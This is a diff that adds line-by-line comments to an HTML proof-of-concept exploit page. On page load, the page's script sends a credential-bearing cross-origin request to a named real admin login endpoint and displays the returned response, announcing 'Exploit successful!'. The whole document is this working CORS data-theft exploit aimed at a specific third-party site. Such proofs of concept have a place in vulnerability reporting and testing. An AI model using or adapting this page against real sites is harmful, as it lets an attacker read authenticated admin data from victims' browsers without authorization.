@@ -22,23 +22,27 @@
     <div id="output">Running exploit...</div>
 
     <script>
+        // Automatically trigger the exploit when the page loads
         window.onload = function() {
             var outputDiv = document.getElementById('output');
-            var req = new XMLHttpRequest();
+            var req = new XMLHttpRequest(); // Create a new XMLHttpRequest object
             
+            // Define what happens when the request is successfully completed
             req.onload = function() {
                 alert('Exploit successful!');
-                outputDiv.innerHTML = '<strong>Response:</strong><br>' + this.responseText;
+                outputDiv.innerHTML = '<strong>Response:</strong><br>' + this.responseText; // Display the response in the output div
             };
             
+            // Define what happens in case of an error
             req.onerror = function() {
                 alert('Exploit failed.');
-                outputDiv.innerHTML = '<strong>Error:</strong> Could not complete the request.';
+                outputDiv.innerHTML = '<strong>Error:</strong> Could not complete the request.'; // Display an error message in the output div
             };
             
+            // Set up the request to the vulnerable login page with credentials included
             req.open('GET', 'https://admin.ayoba.me/admin/auth/login', true);
-            req.withCredentials = true;
-            req.send();
+            req.withCredentials = true; // Send credentials (like cookies) with the request
+            req.send(); // Send the request
         };
     </script>
 </body>
